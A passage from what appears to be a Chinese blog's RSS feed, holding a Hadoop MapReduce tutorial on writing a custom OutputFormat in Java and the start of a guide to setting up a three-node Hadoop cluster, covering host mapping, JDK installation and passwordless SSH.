=16</th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>ReduceTask</td><td>1</td><td>5</td><td>10</td><td>15</td><td>16</td><td>20</td><td>25</td><td>30</td><td>45</td><td>60</td></tr><tr><td>总时间</td><td>892</td><td>146</td><td>110</td><td>92</td><td>88</td><td>100</td><td>128</td><td>101</td><td>145</td><td>104</td></tr></tbody></table><p>3）注意事项</p><p>​      <img src="/2020/11/12/bigdata-mapreduce2-framework/1638354728399.png" alt="1638354728399"></p><h1 id="6-OutputFormat数据输出"><a href="#6-OutputFormat数据输出" class="headerlink" title="6 OutputFormat数据输出"></a>6 OutputFormat数据输出</h1><h2 id="6-1-OutputFormat接口实现类"><a href="#6-1-OutputFormat接口实现类" class="headerlink" title="6.1 OutputFormat接口实现类"></a>6.1 OutputFormat接口实现类</h2><p>​                    <img src="/2020/11/12/bigdata-mapreduce2-framework/1638354781642.png" alt="1638354781642">            </p><h2 id="6-2-自定义OutputFormat"><a href="#6-2-自定义OutputFormat" class="headerlink" title="6.2 自定义OutputFormat"></a>6.2 自定义OutputFormat</h2><p>  <img src="/2020/11/12/bigdata-mapreduce2-framework/1638354799834.png" alt="1638354799834"></p><h2 id="6-3-自定义OutputFormat案例实操"><a href="#6-3-自定义OutputFormat案例实操" class="headerlink" title="6.3 自定义OutputFormat案例实操"></a>6.3 自定义OutputFormat案例实操</h2><p><strong>1）需求</strong></p><p>​    过滤输入的log日志，包含atguigu的网站输出到e:/atguigu.log，不包含atguigu的网站输出到e:/other.log。</p><p>（1）输入数据</p><p>   <img src="/2020/11/12/bigdata-mapreduce2-framework/1638354813110.png" alt="1638354813110"></p><p>（2）期望输出数据</p><p>​     <img src="/2020/11/12/bigdata-mapreduce2-framework/1638354808990.png" alt="1638354808990"></p><p><strong>2）需求分析</strong></p><p>  <img src="/2020/11/12/bigdata-mapreduce2-framework/1638354826027.png" alt="1638354826027"></p><p><strong>3）案例实操</strong></p><p>（1）编写FilterMapper类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>outputformat<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>LongWritable<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>NullWritable<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Mapper<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LogMapper</span> <span class="token keyword">extends</span> <span class="token class-name">Mapper</span><span class="token operator">&lt;</span>LongWritable<span class="token punctuation">,</span> Text<span class="token punctuation">,</span>Text<span class="token punctuation">,</span> NullWritable<span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">map</span><span class="token punctuation">(</span>LongWritable key<span class="token punctuation">,</span> Text value<span class="token punctuation">,</span> Context context<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//不做任何处理,直接写出一行log数据</span>        context<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>NullWritable<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）编写FilterReducer类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>outputformat<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>NullWritable<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Reducer<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LogReducer</span> <span class="token keyword">extends</span> <span class="token class-name">Reducer</span><span class="token operator">&lt;</span>Text<span class="token punctuation">,</span> NullWritable<span class="token punctuation">,</span>Text<span class="token punctuation">,</span> NullWritable<span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">reduce</span><span class="token punctuation">(</span>Text key<span class="token punctuation">,</span> Iterable<span class="token operator">&lt;</span>NullWritable<span class="token operator">></span> values<span class="token punctuation">,</span> Context context<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//防止有相同的数据,迭代写出</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>NullWritable value <span class="token operator">:</span> values<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            context<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>NullWritable<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）自定义一个OutputFormat类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>outputformat<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>NullWritable<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>RecordWriter<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>TaskAttemptContext<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>output<span class="token punctuation">.</span>FileOutputFormat<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LogOutputFormat</span> <span class="token keyword">extends</span> <span class="token class-name">FileOutputFormat</span><span class="token operator">&lt;</span>Text<span class="token punctuation">,</span> NullWritable<span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> RecordWriter<span class="token operator">&lt;</span>Text<span class="token punctuation">,</span> NullWritable<span class="token operator">></span> <span class="token function">getRecordWriter</span><span class="token punctuation">(</span>TaskAttemptContext job<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//创建一个自定义的RecordWriter返回</span>        LogRecordWriter logRecordWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LogRecordWriter</span><span class="token punctuation">(</span>job<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> logRecordWriter<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）编写RecordWriter类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>outputformat<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>FSDataOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>FileSystem<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>Path<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>NullWritable<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>RecordWriter<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>TaskAttemptContext<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LogRecordWriter</span> <span class="token keyword">extends</span> <span class="token class-name">RecordWriter</span><span class="token operator">&lt;</span>Text<span class="token punctuation">,</span> NullWritable<span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> FSDataOutputStream atguiguOut<span class="token punctuation">;</span>    <span class="token keyword">private</span> FSDataOutputStream otherOut<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">LogRecordWriter</span><span class="token punctuation">(</span>TaskAttemptContext job<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//获取文件系统对象</span>            FileSystem fs <span class="token operator">=</span> FileSystem<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>job<span class="token punctuation">.</span><span class="token function">getConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//用文件系统对象创建两个输出流对应不同的目录</span>            atguiguOut <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"d:/hadoop/atguigu.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            otherOut <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"d:/hadoop/other.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span>Text key<span class="token punctuation">,</span> NullWritable value<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        String log <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//根据一行的log数据是否包含atguigu,判断两条输出流输出的内容</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"atguigu"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            atguiguOut<span class="token punctuation">.</span><span class="token function">writeBytes</span><span class="token punctuation">(</span>log <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            otherOut<span class="token punctuation">.</span><span class="token function">writeBytes</span><span class="token punctuation">(</span>log <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span>TaskAttemptContext context<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//关流</span>        IOUtils<span class="token punctuation">.</span><span class="token function">closeStream</span><span class="token punctuation">(</span>atguiguOut<span class="token punctuation">)</span><span class="token punctuation">;</span>        IOUtils<span class="token punctuation">.</span><span class="token function">closeStream</span><span class="token punctuation">(</span>otherOut<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（5）编写FilterDriver类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>outputformat<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>conf<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>Path<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>NullWritable<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Job<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>input<span class="token punctuation">.</span>FileInputFormat<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>output<span class="token punctuation">.</span>FileOutputFormat<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LogDriver</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Configuration conf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Job job <span class="token operator">=</span> Job<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>conf<span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setJarByClass</span><span class="token punctuation">(</span>LogDriver<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setMapperClass</span><span class="token punctuation">(</span>LogMapper<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setReducerClass</span><span class="token punctuation">(</span>LogReducer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setMapOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setMapOutputValueClass</span><span class="token punctuation">(</span>NullWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setOutputValueClass</span><span class="token punctuation">(</span>NullWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置自定义的outputformat</span>        job<span class="token punctuation">.</span><span class="token function">setOutputFormatClass</span><span class="token punctuation">(</span>LogOutputFormat<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FileInputFormat<span class="token punctuation">.</span><span class="token function">setInputPaths</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"D:\\input"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//虽然我们自定义了outputformat，但是因为我们的outputformat继承自fileoutputformat</span>        <span class="token comment" spellcheck="true">//而fileoutputformat要输出一个_SUCCESS文件，所以在这还得指定一个输出目录</span>        FileOutputFormat<span class="token punctuation">.</span><span class="token function">setOutputPath</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"D:\\logoutput"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> b <span class="token operator">=</span> job<span class="token punctuation">.</span><span class="token function">waitForCompletion</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>b <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hadoop/">Hadoop</category>
      
      
      <comments>https://m01ly.github.io/2020/11/12/bigdata-mapreduce2-framework/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hadoop 教程（二）安装hadoop集群-完全分布式部署及API使用</title>
      <link>https://m01ly.github.io/2020/11/12/bigdata-hdfs1/</link>
      <guid>https://m01ly.github.io/2020/11/12/bigdata-hdfs1/</guid>
      <pubDate>Thu, 12 Nov 2020 08:50:28 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h2><p>本文来搭建hadoop集群，准备三台服务器，分别为hadoop102,hadoop103,hadoop104.其中hadoop 采用3.1.3版本，jdk      采用1.8.0_212  。</p><h2 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2 准备工作"></a>2 准备工作</h2><h3 id="2-1-映射"><a href="#2-1-映射" class="headerlink" title="2.1 映射"></a>2.1 映射</h3><p>为了方便直接通过主机名去访问，下面进行映射</p><p>1）修改克隆机主机名，以下以hadoop102举例说明</p><p>（1）修改主机名称，：修改/etc/hostname文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop100 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim /etc/hostname</span>hadoop102<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）配置linux克隆机主机名称映射hosts文件，打开/etc/hosts</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop100 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim /etc/hosts</span>192.168.1.102 hadoop102192.168.1.103 hadoop103192.168.1.104 hadoop104<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2）重启hadoop102</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop100 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）修改windows的主机映射文件（hosts文件）</p><p>操作系统是window10，先拷贝出来，修改保存以后，再覆盖即可</p><p>（a）进入C:\Windows\System32\drivers\etc路径</p><p>（b）拷贝hosts文件到桌面</p><p> （c）打开桌面hosts文件并添加如下内容</p><pre><code>192.168.1.102 hadoop102192.168.1.103 hadoop103192.168.1.104 hadoop104</code></pre><p>（d）将桌面hosts文件覆盖C:\Windows\System32\drivers\etc路径hosts文件</p><h3 id="2-2-安装JDK"><a href="#2-2-安装JDK" class="headerlink" title="2.2 安装JDK"></a>2.2 安装JDK</h3><p>1）在Linux系统下的opt目录中下载软件包</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> /opt/software/jdk-8u212-linux-x64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）解压JDK到/opt/module目录下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）配置JDK环境变量</p><p>​    （1）新建/etc/profile.d/my_env.sh文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> vim /etc/profile.d/my_env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容</p><p>#JAVA_HOME</p><p>export JAVA_HOME=/opt/module/jdk1.8.0_212</p><p>export PATH=$PATH:$JAVA_HOME/bin</p><p>​    （2）保存后退出:wq</p><p>​    （3）source一下/etc/profile文件，让新的环境变量PATH生效</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）测试JDK是否安装成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ java -version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果能看到以下结果，则代表Java安装成功。</p><p>java version “1.8.0_212”</p><p>注意：重启（如果java -version可以用就不用重启）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-3-SSH免密码登录"><a href="#2-3-SSH免密码登录" class="headerlink" title="2.3 SSH免密码登录"></a>2.3 SSH免密码登录</h3><p>免密登录原理如下图所示：</p><p><img src="/2020/11/12/bigdata-hdfs1/1636709256729.png" alt="1636709256729"></p><p>具体操作如下：</p><p>1）生成公钥和私钥：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 .ssh<span class="token punctuation">]</span>$ ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后敲（三个回车），就会生成两个文件id_rsa（私钥）、id_rsa.pub（公钥）</p><p>2）将公钥拷贝到要免密登录的目标机器上</p><p>[root@hadoop102 .ssh]$ ssh-copy-id hadoop102</p><p>[root@hadoop102 .ssh]$ ssh-copy-id hadoop103</p><p>[root@hadoop102 